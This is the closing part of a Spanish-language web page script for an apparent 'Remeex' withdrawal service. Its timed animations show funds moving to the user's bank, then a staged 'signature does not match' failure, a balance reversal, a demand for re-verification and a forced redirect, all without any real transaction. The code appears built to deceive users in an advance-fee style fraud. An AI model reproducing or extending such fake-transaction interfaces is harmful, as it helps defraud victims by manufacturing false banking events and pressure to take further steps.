    showOverlay("overlayProcesoRetiro");
    
    // Inicializar audio
    initAudio();
    
    // Iniciar animación de transferencia de saldo
    animateBalanceTransfer();
    
    // Primera fase: Retirando fondos (40 segundos)
    procesoRetiroTitulo.textContent = `Retirando fondos a ${bancoUsuario}`;
    procesoRetiroTexto.textContent = `Procesando transferencia de ${formatNumberVE(saldoDisponible)} Bs`;
    
    // Animar barra de progreso durante los primeros 40 segundos
    animateProgressBarAdvanced(procesoRetiroProgress, 0, 40, 40000);
    
    // Segunda fase: Verificación de firma (después de 40 segundos, durante 2 segundos)
    setTimeout(() => {
      procesoRetiroTitulo.textContent = `Verificando firma`;
      procesoRetiroTexto.textContent = `${bancoUsuario} indica que tu firma no coincide`;
      
      // Tercera fase: Fallo de firma y restauración del saldo (después de 42 segundos, durante 2 segundos)
      setTimeout(() => {
        // Detener la animación de transferencia y restaurar saldo
        animateBalanceRestoration();
        
        // Actualizar barra de progreso
        animateProgressBarAdvanced(procesoRetiroProgress, 40, 50, 2000);
        
        // Cuarta fase: Verificación requerida (después de 44 segundos, durante 29 segundos)
        setTimeout(() => {
          procesoRetiroTitulo.textContent = `Verificación requerida`;
          procesoRetiroTexto.textContent = `Debes verificar tu firma para poder continuar y acreditar los fondos`;
          
          // Actualización final del progreso
          animateProgressBarAdvanced(procesoRetiroProgress, 50, 100, 29000, () => {
            // Mostrar overlay de firma no coincidente después de 73 segundos en total
            setTimeout(() => {
              stopAudio();
              mostrarOverlayFirmaNoCoincide();
            }, 0);
          });
        }, 2000);
      }, 2000);
    }, 40000);
  }
  
  function mostrarOverlayFirmaNoCoincide() {
    hideOverlay("overlayProcesoRetiro");
    
    // Configurar overlay de firma no coincide
    firmaNoCoincideLogo.src = logoBancoUsuario;
    firmaNoCoincideTexto.textContent = `Necesitamos que vuelvas a firmar para continuar con el proceso de retiro de ${formatNumberVE(saldoDisponible)} Bs a tu cuenta en ${bancoUsuario}. Este paso es necesario para garantizar la seguridad de la transacción.`;
    
    showOverlay("overlayFirmaNoCoincide");
    
    // Reproducir el audio requerido
    playVerificacionAudio();
    
    // Iniciar cuenta regresiva para redirección
    let tiempoRestante = 10;
    redirectCountdown.textContent = tiempoRestante;
    
    animateProgressBarAdvanced(redirectProgressBar, 0, 100, 10000);
    
    redirectCountdownInterval = setInterval(() => {
      tiempoRestante--;
      redirectCountdown.textContent = tiempoRestante;
      
      if (tiempoRestante <= 0) {
        clearInterval(redirectCountdownInterval);
        isRedirecting = true;
        prepararRedirectConLogo();
        window.location.href = "retiroremeex.html";
      }
    }, 1000);
  }/*
    ---------------------------------------------------
    REPRODUCCIÓN DE AUDIO PARA VERIFICACIÓN ADICIONAL
    ---------------------------------------------------
  */
  function playVerificacionAudio() {
    try {
      // Intentar usar YouTube como fuente de audio
      const audioElement = document.createElement("audio");
      audioElement.id = "youtubeAudioSource";
      audioElement.style.display = "none";
      audioElement.src = "https://youtu.be/KWaPj24l_oo";
      document.body.appendChild(audioElement);
      
      // Intentar reproducir
      const playPromise = audioElement.play();
      
      if (playPromise !== undefined) {
        playPromise.catch(error => {
          console.log("Error al reproducir audio directamente:", error);
          
          // Intentar alternativa: usar un iframe de YouTube oculto
          const audioContainer = document.createElement('div');
          audioContainer.id = "youtubeAudioContainer";
          audioContainer.style.display = 'none';
          audioContainer.innerHTML = `
            <iframe id="youtubeFrame" width="1" height="1" 
            src="https://www.youtube.com/embed/KWaPj24l_oo?autoplay=1" 
            frameborder="0" allow="accelerometer; autoplay; encrypted-media; gyroscope; picture-in-picture" 
            allowfullscreen></iframe>
          `;
          document.body.appendChild(audioContainer);
        });
      }
    } catch (e) {
      console.log("Error al manejar audio verificación:", e);
    }
  }

  /*
    FUNCIONES PARA LA NUEVA ANIMACIÓN DE TRANSFERENCIA
  */

  // Variables para la animación del saldo
  let originalBalance = 0; // Se actualizará con el saldo real
  let currentVisaBalance = 0;
  let currentBankBalance = 0.00;
  let animationInterval = null;
  let particlesInterval = null;
  let decrementSteps = 200; // 40 segundos / 0.2 segundos = 200 pasos
  let decrementAmount = 0; // Se calculará en función del balance
  let isRestoringBalance = false;
  let isTransferringReverse = false;

  // Función para ajustar el tamaño de texto según el saldo
  function adjustBalanceTextSize(balanceElem) {
    if (!balanceElem) return;
    
    const text = balanceElem.textContent;
    const digitsCount = text.replace(/[^\d]/g, '').length;
    
    // Si el número es muy grande
    if (digitsCount > 8) {
      balanceElem.classList.add('small-text');
    } else {
      balanceElem.classList.remove('small-text');
    }
  }

  // Función para actualizar la visualización del saldo con formato
  function updateBalanceDisplay(balanceElem, balance) {
    if (!balanceElem) return;
    
    balanceElem.textContent = formatNumberVE(balance) + " Bs";
    
    // Ajustar tamaño de texto si es necesario
    adjustBalanceTextSize(balanceElem);
  }

  // Función para crear partículas de dinero
  function createMoneyParticle(isReverse = false) {
    const container = document.getElementById('transferParticles');
    if (!container) return;
    
    const particle = document.createElement('div');
    particle.classList.add('money-particle');
    
    // Posición vertical para compatibilidad con el nuevo diseño en columna
    const startY = isReverse ? '90%' : '10%';
    const endY = isReverse ? '10%' : '90%';
    
    // Posición X aleatoria para distribuir las partículas horizontalmente
    const posX = Math.random() * 100;
    
    // Tamaño aleatorio para variedad
    const size = Math.random() * 3 + 2; // 2-5px
    particle.style.width = `${size}px`;
    particle.style.height = `${size}px`;
    
    // Color aleatorio entre verde y amarillo para simular billetes
    const colors = ['#39ff14', '#5fff3f', '#7fff00', '#adff2f', '#ffff00'];
    const color = colors[Math.floor(Math.random() * colors.length)];
    particle.style.backgroundColor = color;
    
    // Añadir al DOM
    container.appendChild(particle);
    
    // Animar con CSS transitions
    particle.style.transition = 'all 0.6s linear';
    particle.style.left = `${posX}%`;
    particle.style.top = startY;
    particle.style.opacity = '0';
    
    // Forzar reflow
    void particle.offsetWidth;
    
    // Aplicar animación
    particle.style.top = endY;
    particle.style.opacity = '0.8';
    
    // Eliminar después de la animación
    setTimeout(() => {
      if (particle.parentNode) {
        particle.parentNode.removeChild(particle);
      }
    }, 700);
  }

  // Función para iniciar el flujo de partículas
  function startParticlesFlow(isReverse = false) {
    // Detener intervalo existente
    if (particlesInterval) {
      clearInterval(particlesInterval);
    }
    
    // Configurar dirección del flujo
    const transferAnimation = document.querySelector('.transfer-animation');
    if (transferAnimation) {
      if (isReverse) {
        transferAnimation.classList.add('reverse');
      } else {
        transferAnimation.classList.remove('reverse');
      }
    }
    
    // Iniciar nuevo flujo de partículas
    particlesInterval = setInterval(() => {
      // Crear múltiples partículas en cada intervalo
      const count = Math.floor(Math.random() * 2) + 1; // 1-2 partículas
      for (let i = 0; i < count; i++) {
        createMoneyParticle(isReverse);
      }
    }, 150);
  }// Función para detener el flujo de partículas
  function stopParticlesFlow() {
    if (particlesInterval) {
      clearInterval(particlesInterval);
      particlesInterval = null;
    }
  }

  // Función para mostrar/ocultar la tarjeta del banco o el logo
  function toggleBankCard(show) {
    const bankCard = document.getElementById('bankCardContainer');
    const logoOverlay = document.getElementById('bankLogoOverlay');
    
    if (!bankCard || !logoOverlay) return;
    
    if (show) {
      bankCard.classList.add('active');
      logoOverlay.classList.remove('active');
    } else {
      bankCard.classList.remove('active');
      
      // Mostrar el logo del banco en su lugar
      logoOverlay.classList.add('active');
      
      // Reset del balance bancario
      currentBankBalance = 0;
      const bankBalanceAmount = document.getElementById('bankBalanceAmount'); 
      if (bankBalanceAmount) {
        updateBalanceDisplay(bankBalanceAmount, currentBankBalance);
      }
    }
  }

  // Función para animar la disminución/aumento de saldos
  function animateBalanceTransfer() {
    const remeexBalanceAmount = document.getElementById("remeexBalanceAmount");
    const bankBalanceAmount = document.getElementById("bankBalanceAmount");
    
    if (!remeexBalanceAmount || !bankBalanceAmount) return;
    
    // Establecer el saldo original desde el saldo disponible
    originalBalance = saldoDisponible;
    decrementAmount = originalBalance / decrementSteps;
    
    // Mostrar tarjeta del banco
    toggleBankCard(true);
    
    // Aplicar efecto pulsante a los saldos
    remeexBalanceAmount.classList.add('pulsing');
    bankBalanceAmount.classList.add('pulsing');
    
    // Iniciar flujo de partículas
    startParticlesFlow(false);
    
    // Limpiar cualquier animación existente
    if (animationInterval) {
      clearInterval(animationInterval);
    }
    
    // Valores iniciales
    currentVisaBalance = originalBalance;
    currentBankBalance = 0;
    
    updateBalanceDisplay(remeexBalanceAmount, currentVisaBalance);
    updateBalanceDisplay(bankBalanceAmount, currentBankBalance);
    
    animationInterval = setInterval(() => {
      if (isRestoringBalance) return;
      
      // Disminuir saldo de Visa
      currentVisaBalance -= decrementAmount;
      if (currentVisaBalance < 0) currentVisaBalance = 0;
      
      // Aumentar saldo del banco
      currentBankBalance += decrementAmount;
      if (currentBankBalance > originalBalance) currentBankBalance = originalBalance;
      
      // Aplicar efecto de escala para retroalimentación visual
      remeexBalanceAmount.style.transform = "scale(1.05)";
      bankBalanceAmount.style.transform = "scale(1.05)";
      
      setTimeout(() => {
        remeexBalanceAmount.style.transform = "scale(1.0)";
        bankBalanceAmount.style.transform = "scale(1.0)";
      }, 100);
      
      // Actualizar la visualización
      updateBalanceDisplay(remeexBalanceAmount, currentVisaBalance);
      updateBalanceDisplay(bankBalanceAmount, currentBankBalance);
      
      // Si hemos transferido todo el saldo, detener la animación
      if (currentVisaBalance <= 0) {
        clearInterval(animationInterval);
        animationInterval = null;
        
        // Quitar efecto pulsante
        remeexBalanceAmount.classList.remove('pulsing');
      }
    }, 200); // Actualizar cada 200ms
  }

  // Función para animar la restauración del saldo (para el fallo de firma)
  function animateBalanceRestoration() {
    const remeexBalanceAmount = document.getElementById("remeexBalanceAmount");
    const bankBalanceAmount = document.getElementById("bankBalanceAmount");
    
    if (!remeexBalanceAmount || !bankBalanceAmount) return;
    
    isRestoringBalance = true;
    
    // Indicar que la transferencia ahora es en sentido inverso
    isTransferringReverse = true;
    
    // Detener el flujo actual y comenzar en dirección inversa
    stopParticlesFlow();
    startParticlesFlow(true);
    
    // Pausar la animación de decremento
    const currentRemeexValue = currentVisaBalance;
    const currentBankValue = currentBankBalance;
    
    // Definir duración y pasos de la animación
    const restoreDuration = 2000; // 2 segundos
    const restoreSteps = 20; // 100ms por paso
    const restoreVisaStepAmount = (originalBalance - currentRemeexValue) / restoreSteps;
    const restoreBankStepAmount = currentBankValue / restoreSteps;
    
    // Aplicar animación de destello
    remeexBalanceAmount.style.animation = "money-flash 1s infinite";
    bankBalanceAmount.style.animation = "money-flash 1s infinite";
    
    // Iniciar restauración
    let step = 0;
    const restoreInterval = setInterval(() => {
      step++;
      
      // Aumentar saldo de Visa
      currentVisaBalance += restoreVisaStepAmount;
      if (currentVisaBalance > originalBalance) currentVisaBalance = originalBalance;
      
      // Disminuir saldo del banco
      currentBankBalance -= restoreBankStepAmount;
      if (currentBankBalance < 0) currentBankBalance = 0;
      
      // Aplicar efecto de escala para retroalimentación visual
      remeexBalanceAmount.style.transform = "scale(1.05)";
      bankBalanceAmount.style.transform = "scale(1.05)";
      setTimeout(() => {
        remeexBalanceAmount.style.transform = "scale(1.0)";
        bankBalanceAmount.style.transform = "scale(1.0)";
      }, 50);
      
      // Actualizar visualización
      updateBalanceDisplay(remeexBalanceAmount, currentVisaBalance);
      updateBalanceDisplay(bankBalanceAmount, currentBankBalance);
      
      // Si la restauración está completa
      if (step >= restoreSteps) {
        clearInterval(restoreInterval);
        
        // Eliminar animación una vez completada
        setTimeout(() => {
          remeexBalanceAmount.style.animation = "";
          bankBalanceAmount.style.animation = "";
          
          isRestoringBalance = false;
          isTransferringReverse = false;
          
          // Detener partículas después de un breve retraso
          setTimeout(() => {
            stopParticlesFlow();
            
            // Ocultar tarjeta del banco y mostrar el logo
            setTimeout(() => {
              toggleBankCard(false);
            }, 500);
          }, 1000);
        }, 500);
      }
    }, restoreDuration / restoreSteps);
  }/*
    Overlays y Efectos Mejorados
  */
  function setupOverlayListeners() {
    editarFirmaBtn.addEventListener("click", () => {
      hideOverlay("overlayConfirmFirma");
    });
    continuarFirmaBtn.addEventListener("click", () => {
      hideOverlay("overlayConfirmFirma");
      startSecuenciaFirma();
    });
    entendidoRetiroBtn.addEventListener("click", () => {
      iniciarProcesoRetiro();
    });
    finalBtn.addEventListener("click", () => {
      hideOverlay("overlayFinal");
      // Redirigir
      isRedirecting = true;
      prepararRedirectConLogo();
      window.location.href = "retiroremeex.html";
    });
  }
  
  function setupOverlayEffects() {
    // Agregar evento de seguimiento del cursor para el efecto de resplandor
    const overlays = document.querySelectorAll('.overlay');
    overlays.forEach(overlay => {
      overlay.addEventListener('mousemove', handleMouseMove);
    });
  }
  
  function handleMouseMove(e) {
    const modal = e.currentTarget.querySelector('.modal-glow');
    if (!modal) return;
    
    const rect = modal.getBoundingClientRect();
    const x = ((e.clientX - rect.left) / rect.width) * 100;
    const y = ((e.clientY - rect.top) / rect.height) * 100;
    
    modal.style.setProperty('--mouse-x', `${x}%`);
    modal.style.setProperty('--mouse-y', `${y}%`);
  }
  
  function animateProgressBarAdvanced(progressBar, startWidth, targetWidth, duration, callback) {
    if (!progressBar) return;
    
    const startTime = performance.now();
    const percentDisplay = progressBar.parentNode.querySelector('.progress-percentage');
    
    function updateProgress(currentTime) {
      const elapsedTime = currentTime - startTime;
      const progress = Math.min(elapsedTime / duration, 1);
      const currentWidth = startWidth + (targetWidth - startWidth) * easeOutQuad(progress);
      
      progressBar.style.width = `${currentWidth}%`;
      if (percentDisplay) {
        percentDisplay.textContent = `${Math.round(currentWidth)}%`;
      }
      
      if (progress < 1) {
        requestAnimationFrame(updateProgress);
      } else if (callback) {
        callback();
      }
    }
    
    requestAnimationFrame(updateProgress);
  }
  
  function resetProgressBarAnimated(progressBar) {
    if (!progressBar) return;
    
    const percentDisplay = progressBar.parentNode.querySelector('.progress-percentage');
    
    // Desaparecer suavemente
    progressBar.style.transition = 'opacity 0.3s';
    progressBar.style.opacity = '0';
    
    setTimeout(() => {
      // Resetear al principio sin animación
      progressBar.style.transition = 'none';
      progressBar.style.width = '0%';
      if (percentDisplay) {
        percentDisplay.textContent = '0%';
      }
      
      // Reaparecer
      setTimeout(() => {
        progressBar.style.transition = 'opacity 0.3s, width 0.6s cubic-bezier(0.34, 1.56, 0.64, 1)';
        progressBar.style.opacity = '1';
      }, 50);
    }, 300);
  }
  
  function easeOutQuad(t) {
    return t * (2 - t);
  }
  
  function showOverlay(id) {
    const overlay = document.getElementById(id);
    if (overlay) {
      overlay.classList.add("active");
      
      // Si el overlay tiene barras de progreso con porcentaje 0, iniciar animación
      const progressBar = overlay.querySelector(".progress-bar-advanced");
      if (progressBar && progressBar.style.width === "0%") {
        setTimeout(() => {
          const targetWidth = 50; // Valor por defecto
          animateProgressBarAdvanced(progressBar, 0, targetWidth, 1500);
        }, 500);
      }
    }
  }
  
  function hideOverlay(id) {
    const overlay = document.getElementById(id);
    if (overlay) {
      overlay.classList.remove("active");
      
      // Si estamos ocultando el overlay de firma no coincide, limpiar el intervalo
      if (id === "overlayFirmaNoCoincide" && redirectCountdownInterval) {
        clearInterval(redirectCountdownInterval);
        redirectCountdownInterval = null;
      }
    }
  }
  
  function startSecuenciaFirma() {
    if (secuenciaFirmaImagen) secuenciaFirmaImagen.src = signatureDataURL;
    if (secuenciaFirmaLogo) secuenciaFirmaLogo.src = logoBancoUsuario;
    
    showOverlay("overlaySecuenciaFirma");
    
    secuenciaFirmaTitulo.textContent = `Conectando con ${bancoUsuario}...`;
    secuenciaFirmaTexto.textContent = "Por favor, espera...";
    
    // Iniciar animación de la barra de progreso
    animateProgressBarAdvanced(secuenciaFirmaProgress, 0, 30, 3000);

    setTimeout(() => {
      secuenciaFirmaTitulo.textContent = `Analizando tu firma registrada en ${bancoUsuario}...`;
      secuenciaFirmaTexto.textContent = "Comparando trazos y coincidencias...";
      animateProgressBarAdvanced(secuenciaFirmaProgress, 30, 70, 4000);
      
      setTimeout(() => {
        secuenciaFirmaTitulo.textContent = "Verificación completada";
        secuenciaFirmaTexto.textContent = "Tu firma ha sido procesada correctamente.";
        animateProgressBarAdvanced(secuenciaFirmaProgress, 70, 100, 2000);
        
        setTimeout(() => {
          hideOverlay("overlaySecuenciaFirma");
          goToStep6();
        }, 4000);
      }, 6000);
    }, 6000);
  }/*
    Navegación de pasos
  */
  function hideSteps() {
    const steps = document.querySelectorAll(".section-content");
    steps.forEach(step => {
      step.classList.remove("active");
    });
  }
  
  function goToStep2() {
    hideSteps();
    document.getElementById("step2").classList.add("active");
    progressBarFill.style.width = "40%";
    progressText.textContent = "Paso 2 de 5";
  }
  
  function goToStep3() {
    hideSteps();
    document.getElementById("step3").classList.add("active");
    progressBarFill.style.width = "60%";
    progressText.textContent = "Paso 3 de 5";
  }
  
  function goToStep4() {
    hideSteps();
    document.getElementById("step4").classList.add("active");
    progressBarFill.style.width = "80%";
    progressText.textContent = "Paso 4 de 5";
  }
  
  function goToStep5() {
    hideSteps();
    document.getElementById("step5").classList.add("active");
    progressBarFill.style.width = "100%";
    progressText.textContent = "Paso 5 de 5";
    initSignatureCanvas();
  }
  
  function goToStep6() {
    hideSteps();
    document.getElementById("step6").classList.add("active");
    // Barra llena, finalizado
    progressBarFill.style.width = "100%";
    progressText.textContent = "Planilla de Retiro";
    renderFinalSummary();
  }

  /*
    Utilidades
  */
  function formatNumberVE(num) {
    try {
      // Asegurar que num sea un número
      const numFloat = parseFloat(num);
      if (isNaN(numFloat)) return "0,00";
      
      return Number(numFloat).toLocaleString("es-VE", {
        minimumFractionDigits: 2,
        maximumFractionDigits: 2,
      });
    } catch (e) {
      console.error("Error al formatear número:", e);
      return "0,00";
    }
  }

  // Función para obtener el logo del banco usando mapeo mejorado
  function getBankLogoURL(bankName) {
    const defaultLogo = "https://via.placeholder.com/100x50?text=Banco";
    if (!bankName) return defaultLogo;
    
    const normalizedInput = normalizeBankName(bankName);
    
    // Búsqueda directa
    if (normalizedBankLogosMapping[normalizedInput]) {
      return normalizedBankLogosMapping[normalizedInput];
    }
    
    // Búsqueda parcial
    for (let key in normalizedBankLogosMapping) {
      if (normalizedInput.includes(key) || key.includes(normalizedInput)) {
        return normalizedBankLogosMapping[key];
      }
    }
    
    return defaultLogo;
  }

  // Función para transferir el logo del banco a retiroremeex.html
  function prepararRedirectConLogo() {
    const datosRemeex = JSON.parse(sessionStorage.getItem("datosRemeex") || "{}");
    
    // Asegurarse de que el logo del banco esté guardado
    if (datosRemeex.bankName && !datosRemeex.bankLogo) {
      datosRemeex.bankLogo = getBankLogoURL(datosRemeex.bankName);
      sessionStorage.setItem("datosRemeex", JSON.stringify(datosRemeex));
    }
    
    // También guardar en localStorage para mayor persistencia
    localStorage.setItem("datosRemeex", JSON.stringify(datosRemeex));
    
    // Guardar el logo específicamente
    if (datosRemeex.bankLogo) {
      sessionStorage.setItem("bankLogo", datosRemeex.bankLogo);
      localStorage.setItem("bankLogo", datosRemeex.bankLogo);
    }
  }

  // Funciones de audio
  let audioElement = null;

  function initAudio() {
    try {
      // Primer intento: elemento de audio directo
      audioElement = document.createElement("audio");
      audioElement.style.display = "none";
      document.body.appendChild(audioElement);
      
      // Establecer fuente al tema de Eurovision
      audioElement.src = "https://www.youtube.com/watch?v=sP1qO-lhoXQ";
      
      // Establecer volumen e intentar reproducir
      audioElement.volume = 0.3;
      
      const playPromise = audioElement.play();
      if (playPromise !== undefined) {
        playPromise.catch(error => {
          console.log("Error al reproducir audio directamente:", error);
          initYouTubeAudio(); // Fallback a iframe de YouTube
        });
      }
    } catch (e) {
      console.log("Error con elemento de audio:", e);
      initYouTubeAudio(); // Fallback a iframe de YouTube
    }
  }

  function initYouTubeAudio() {
    try {
      // Crear iframe de YouTube
      const ytContainer = document.createElement('div');
      ytContainer.style.display = 'none';
      ytContainer.innerHTML = `
        <iframe id="youtubeAudio" width="1" height="1" 
        src="https://www.youtube.com/embed/sP1qO-lhoXQ?autoplay=1&enablejsapi=1" 
        frameborder="0" allow="accelerometer; autoplay; encrypted-media; gyroscope; picture-in-picture" 
        allowfullscreen></iframe>
      `;
      document.body.appendChild(ytContainer);
    } catch (e) {
      console.log("Error con fallback de YouTube:", e);
    }
  }

  function stopAudio() {
    // Detener audio si existe
    if (audioElement) {
      audioElement.pause();
      audioElement.remove();
      audioElement = null;
    }
    
    // Eliminar iframe de YouTube si existe
    const ytFrame = document.getElementById('youtubeAudio');
    if (ytFrame && ytFrame.parentNode) {
      ytFrame.parentNode.remove();
    }
    
    // Detener el reproductor de YouTube si está siendo utilizado
    if (youtubePlayer && typeof youtubePlayer.stopVideo === 'function') {
      youtubePlayer.stopVideo();
      youtubePlayer = null;
    }
  }
</script>

<!-- Integración de Tawk.to para soporte en vivo -->
<script>
  var Tawk_API=Tawk_API||{}, Tawk_LoadStart=new Date();
  (function(){
    var s1=document.createElement("script"), s0=document.getElementsByTagName("script")[0];
    s1.async=true;
    s1.src='https://embed.tawk.to/676eba4c49e2fd8dfeff071f/1ig48fetj';
    s1.charset='UTF-8';
    s1.setAttribute('crossorigin','*');
    s0.parentNode.insertBefore(s1,s0);
  })();
</script>

</body>
</html>